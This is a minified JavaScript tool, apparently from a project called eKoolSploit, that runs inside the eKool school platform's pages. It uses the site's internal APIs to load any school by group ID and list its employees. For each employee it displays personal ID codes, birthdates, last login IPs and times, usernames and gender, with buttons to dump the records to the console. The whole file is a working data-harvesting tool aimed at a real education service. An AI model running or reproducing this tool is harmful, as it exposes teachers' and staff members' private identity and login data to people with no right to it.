var eksLogo = "https://raw.githubusercontent.com/roledxd/eKoolSploit/master/eKoolSploitLogoPNG.png",
    eKSEV = {
        currentGroupId: null,
        currentGroupObj: null,
        currentEmployees: null,
        schoolslist: function() {
            var e = null;
            for (ccachePH.getInstitutionsList(function(n) {
                    e = n
                }); null !== e;) return e
        },
        viewerHtml: function() {
            var e = eKSEV.currentGroupObj.groupData,
                n = eksLogo;
            null !== e.logoImgFn ? n = eKSEV.genEkoolFilesLink(e.logoImgFn) : n = eksLogo;
            return '<div> <h3 class="modalDialogTitle">eKSEV - ' + e.name + '</h3> <span class="avatar FL ML20 MR30 RC3 iPersonLogoImg prof"><img src="' + n + '"></img></span> <ul class="edit leftLabels labelsInBold FL W350"> <li class="FWB"> <label id="eKSEV_schoolname">' + e.name + "(" + e.id + ')</label> </li><li> <label></label> </li><li> <div class="row" id="eKSEV_ehisId">EhisId: ' + e.ehisId + '</div></li></ul> </div><div class="clearer"></div><div class="MT20 FWB"> <button type="button" class="g-button col-xs-4 DIB RC0" onclick="eKSEV.tabs.schoolData();">Данные группы</button> <button type="button" class="g-button col-xs-4 DIB BL0 BR0 RC0" id="personalViewBtn" onclick="eKSEV.tabs.employees();">Персонал</button> <button type="button" class="g-button col-xs-4 DIB RC0" onclick="eKSEV.tabs.other();">Другое</button></div><table id="updateableregionSchoolCardEventsTable" class="fulltable withInnerColumnBorders withBottomRowBorder POSREL" border="0" cellspacing="0"> <tbody id="viewerFrame3"> <tr class="nocontent"> <td id="content_title" colspan="2" class="PT30 PB30"> <div id="eKSEV_content">... ' + e.name + "...</div></td></tr></tbody> </table>"
        },
        hubHtml: function() {
            var e = "<h4>You can also load a group by visiting it's page. Here you will see a button of last group you have visited.</h4>";
            return "undefined" != typeof gmainv2PH && null !== gmainv2PH.groupId && null !== gmainv2PH.groupObj && (e = '<h4>OR</h4><button type="button" id="eKSEVLOADCURRENT" class="g-button col-xs-7 DIB RC0 selected" onclick="eKSEV.updateHubGroupInfo(' + gmainv2PH.groupId + ');eKSEV.openViewer();">Use current (' + gmainv2PH.groupObj.groupData.name + ")</button>"), '<div><h3 class="modalDialogTitle">eKSEV</h3><span class="avatar FL ML20 MR30 RC3 iPersonLogoImg prof"> <img id="groupImage" src="' + eksLogo + '"></span> <ul class="edit leftLabels labelsInBold FL W350"><form><h4>Load by GroupId:</h4><input type="text" id="groupIdInput" onkeyup="eKSEV.groupIdInputChanged();" name="groupIdInput">' + e + '</form></ul> </div><div class="clearer"></div><div class="MT20 FWB"><button type="button" disabled=true id="eKSEVLOAD" class="g-button col-xs-12 DIB RC0 selected" onclick="eKSEV.openViewer();">Load</button></div> <table id="updateableregionSchoolCardEventsTable" class="fulltable withInnerColumnBorders withBottomRowBorder POSREL" border="0" cellspacing="0"><tbody id="viewerFrame3"><tr class="nocontent"><td colspan="3" class="PT30 PB30"><div id="schoolNameById">No Group Selected</div></td></tr></tbody></table>'
        },
        tabs: {
            schoolData: async function() {
                document.getElementById("eKSEV_content").innerHTML = null, document.getElementById("content_title").innerHTML = "Данные группы<hr><div id='eKSEV_content'></div>", document.getElementById("eKSEV_content").style.overflowY = "scroll", document.getElementById("eKSEV_content").style.height = "auto", document.getElementById("eKSEV_content").style.maxHeight = "400px", await eKSEV.addSchoolInfoToTab()
            },
            employees: async function() {
                document.getElementById("eKSEV_content").innerHTML = null, document.getElementById("content_title").innerHTML = "Персонал<hr><div id='eKSEV_content'></div>", document.getElementById("eKSEV_content").style.overflowY = "scroll", document.getElementById("eKSEV_content").style.height = "auto", document.getElementById("eKSEV_content").style.maxHeight = "400px", await eKSEV.addEmployeesToTab()
            },
            other: async function() {
                document.getElementById("eKSEV_content").innerHTML = null, document.getElementById("content_title").innerHTML = "Другое<hr><div id='eKSEV_content'></div>", document.getElementById("eKSEV_content").style.overflowY = "scroll", document.getElementById("eKSEV_content").style.height = "auto", document.getElementById("eKSEV_content").style.maxHeight = "400px", document.getElementById("eKSEV_content").innerHTML += schoolTable
            }
        },
        addSchoolInfoToTab: async function() {
            var e = eKSEV.generateSchoolDiv();
            document.getElementById("eKSEV_content").innerHTML += e
        },
        generateSchoolDiv: function() {
            var e = eKSEV.currentGroupObj,
                n = e.groupData;
            if (null != e) {
                var t = "";
                return isNaN(n.ehisId) || null === n.ehisId || (t += eKSEV.genTableInner("EHIS ID", '<a target="_blank" href="https://enda.ehis.ee/avalik/avalik/oppeasutus/OppeasutusKuva.faces?id=' + n.ehisId + '">' + n.ehisId + "</a>")), null !== n.url && (t += eKSEV.genTableInner("School URL", '<a target="_blank" href="' + n.url + '">' + n.url + "</a>")), null !== n.timetableUrl && (t += eKSEV.genTableInner("Timetable URL", '<a target="_blank" href="' + n.timetableUrl + '">' + n.timetableUrl + "</a>")), null !== n.creator && (t += eKSEV.genTableInner("Created by", n.creator)), null !== n.created && (t += eKSEV.genTableInner("Created at", n.created)), null !== n.email && null !== n.email.name && (t += eKSEV.genTableInner("Email", '<a href="mailto:' + n.email.name + '">' + n.email.name + "</a>")), null !== n.email && null !== n.email.created && null !== n.email.modified && (t += eKSEV.genTableInner("Email (CR | MOD)", n.email.created + " | " + n.email.modified)), null !== n.email && null !== n.email.creator && (t += eKSEV.genTableInner("Email Creator", n.email.creator)), null !== n.email && null !== n.email.modifier && (t += eKSEV.genTableInner("Email Modifier", n.email.modifier)), t += eKSEV.genTableInner("Group Object", '<a onclick="eKSEV.printSchoolObject();">Print to console</a>'), '<div id="schooltable_' + n.id + '" style="margin-top: 2%;"><table style="padding-left: 5px;padding-bottom:3px; font-size:10px;"><tbody id="tableBody-eksev">' + t + "</tbody></table></div>"
            }
            return "Can't load the group."
        },
        addEmployeesToTab: async function() {
            await eKSEV.currentEmployees.forEach(e => {
                var n = eKSEV.generateProfileDiv(e);
                document.getElementById("eKSEV_content").innerHTML += n
            })
        },
        show: function() {
            clayoutPH.initMMModalDialog({
                preferredWidth: 550,
                hasCloseButton: !0,
                innerPadding: 0
            }), $("modaldialog_content").update(eKSEV.hubHtml())
        },
        switchUserTable: function(e) {
            var n = eKSEV.currentEmployees.find(n => n.id === e);
            if (n) {
                var t = document.getElementById("tableBtn_" + e);
                if (n.isTableOpen) {
                    (l = document.getElementById("usertable_" + e)).remove(), n.isTableOpen = !1, t.innerText = "Расширить"
                } else {
                    var l = eKSEV.generateUserTableDiv(n);
                    document.getElementById("userElement_" + e).insertAdjacentHTML("beforeend", l), n.isTableOpen = !0, t.innerText = "Свернуть"
                }
            }
        },
        groupIdInputChanged: function() {
            document.getElementById("eKSEVLOAD").disabled = !0;
            var e = document.getElementById("groupIdInput").value;
            if (!isNaN(e)) {
                var n = eKSEV.schoolslist().find(n => n.id == e);
                "null" != typeof n && void 0 !== n ? eKSEV.updateHubGroupInfo(n.id) : eKSEV.updateHubGroupInfo(null)
            }
        },
        genTableInner: function(e, n) {
            return null !== e && null !== n ? '<tr id="tableInner_' + e + '"><th id="title"><h3 style="text-align: left;">' + e + '</h3></th><td id="value"><h3 style="text-align: left;">' + n + "</h3></td></tr>" : null
        },
        generateUserTableDiv: function(e) {
            if (null !== e) {
                var n = "";
                if (null !== e.userName && (n += eKSEV.genTableInner("Username", e.userName)), null !== e.id && (n += eKSEV.genTableInner("userId", e.id)), null !== e.idCode && (null !== e.idIssuedBy ? n += eKSEV.genTableInner("idCode", "[" + e.idIssuedBy.isoCode + "] " + e.idCode + "<br>" + e.idIssuedBy.created) : n += eKSEV.genTableInner("idCode", e.idCode)), null !== e.created && (n += eKSEV.genTableInner("Creation Date", e.created)), null !== e.creator && (n += eKSEV.genTableInner("Created by", e.creator)), null !== e.modifier && (n += eKSEV.genTableInner("Modifier", e.modifier)), null !== e.birthDay && (n += eKSEV.genTableInner("Birthdate", e.birthDay)), null !== e.lastIp && (n += eKSEV.genTableInner("Last IP", e.lastIp)), null !== e.lastLogin && (n += eKSEV.genTableInner("Last Login", e.lastLogin)), null !== e.gender) {
                    var t = e.gender;
                    n += 0 == t ? eKSEV.genTableInner("Gender", "Male (" + t + ")") : 1 == t ? eKSEV.genTableInner("Gender", "Female (" + t + ")") : eKSEV.genTableInner("Gender", "Undefined (" + t + ")")
                }
                return null !== e.optLock && (n += eKSEV.genTableInner("Optlock", e.optLock)), null !== e.profileImgFn && (n += eKSEV.genTableInner("Avatar Link", "<a target='_blank' href='" + eKSEV.genEkoolFilesLink(e.profileImgFn) + "'>Open in a new teb</a>")), null !== e.langCode && (n += eKSEV.genTableInner("Language Code", e.langCode)), n += eKSEV.genTableInner("Actions", '<a onclick="eKSEV.printUserProfile(' + e.id + ')">Print to console</a><br><a onclick="eKSEV.viewprofile(' + e.id + ')">View profile</a>'), '<div id="usertable_' + e.id + '" style="margin-top: 2%;"><table style="padding-left: 5px;padding-bottom:3px; font-size:10px;"><tbody id="tableBody-eksev">' + n + "</tbody></table></div>"
            }
            return null
        },
        viewprofile: function(e) {
            eKSEV.lochash("#/?screenId=g.person.show&personId=" + e)
        },
        lochash: function(e) {
            location.hash = e
        },
        printUserProfile: function(e) {
            if (e) {
                var n = eKSEV.currentEmployees.find(n => n.id === e);
                console.log(n)
            }
        },
        printSchoolObject: function() {
            var e = eKSEV.currentGroupObj;
            console.log(e)
        },
        generateProfileDiv: function(e) {
            if (null !== e) {
                if (null != e.profileImgFn) var n = eKSEV.genEkoolFilesLink(e.profileImgFn);
                else n = "r/gen/a/" + chelperPH.refreshUID + "/r/img/user_icon_default.png";
                var t = "",
                    l = "";
                if (eKSEV.currentGroupObj.groupAdminList.find(n => n.id === e.id)) {
                    t = "bold";
                    l += ' <span class="badge badge-success">Admin</span>'
                }
                return eKSEV.currentGroupObj.groupTeacherList.find(n => n.id === e.id) && (l += ' <span class="badge badge-primary">Teacher</span>'), html = '<div class="identity MT5" id="userElement_' + e.id + '"><h2 class="h1"><img src="' + n + '" class="avatar iPersonLogoImg prof MR10 POSREL" style="width:74px;height:74px;top:0px;left:0px;"><span class="iProfileName ' + t + ' h2">' + e.name1 + " " + e.name2 + " </span>" + l + '<a link id="tableBtn_' + e.id + '" onclick="eKSEV.switchUserTable(' + e.id + ');" style="float:right;"class="iProfileName h2">Расширить</a></h2></div><hr>', html
            }
            return !1
        },
        getEmployees: function() {
            peopleResourceManager.getAllActiveEmployeesByInstitutionId(eKSEV.currentGroupId, {
                callback: function(e) {
                    eKSEV.currentEmployees = e.returnObject, eKSEV.currentEmployees.forEach(e => {
                        e.isTableOpen = !1
                    }), eKSEV.currentEmployees.sort(function(e, n) {
                        return e.name1 < n.name1 ? -1 : e.name1 > n.name1 ? 1 : 0
                    }), eKSEV.currentEmployees.sort(function(e, n) {
                        var t = eKSEV.currentGroupObj.groupTeacherList.find(n => n.id === e.id);
                        return t ? -1 : t ? 0 : 1
                    }), eKSEV.currentEmployees.sort(function(e, n) {
                        var t = eKSEV.currentGroupObj.groupAdminList.find(n => n.id === e.id);
                        return t ? -1 : t ? 0 : 1
                    }), document.getElementById("eKSEVLOAD").disabled = !1
                }
            })
        },
        genEkoolFilesLink: function(e) {
            return "https://files.ekool.eu/" + e
        },
        updateGroupData: function(e) {
            ccachePH.groupObj(e, !0, function(e) {
                "object" != e && "undefined" != e && (eKSEV.currentGroupId = e.groupData.id, eKSEV.currentGroupObj = e, eKSEV.getEmployees())
            })
        },
        clearGroupData: function() {
            currentGroupId = null, currentGroupObj = null, currentEmployees = null
        },
        updateHubGroupInfo: function(e) {
            if (document.getElementById("schoolNameById").innerText = "Getting Group Data...", document.getElementById("groupImage").src = eksLogo, null == e) return document.getElementById("schoolNameById").innerText = "No Group Selected", void(document.getElementById("groupImage").src = eksLogo);
            try {
                ccachePH.groupObj(e, !0, function(n) {
                    if ("object" != n && "undefined" != n) {
                        if (eKSEV.updateGroupData(e), null !== n.groupData.logoImgFn) {
                            var t = eKSEV.genEkoolFilesLink(n.groupData.logoImgFn);
                            document.getElementById("groupImage").src = t
                        } else document.getElementById("groupImage").src = eksLogo;
                        document.getElementById("schoolNameById").innerText = n.groupData.name
                    } else document.getElementById("schoolNameById").innerText = "Invalid GroupId", document.getElementById("groupImage").src = eksLogo
                })
            } catch (e) {
                document.getElementById("schoolNameById").innerText = "Error: " + e
            }
        },
        openViewer: function() {
            null !== eKSEV.currentGroupObj ? (clayoutPH.initMMModalDialog({
                preferredWidth: 550,
                hasCloseButton: !0,
                innerPadding: 0
            }), $("modaldialog_content").update(eKSEV.viewerHtml()), document.getElementsByClassName("ico-x_close noPrint")[0].onclick += " eKSEV.clearGroupData();", document.getElementById("personalViewBtn").innerHTML = "Персонал (" + eKSEV.currentEmployees.length + ")") : chelperPH.showError("eKSEV Error", "eKSEV.currentGroupId = null")
        }
    };
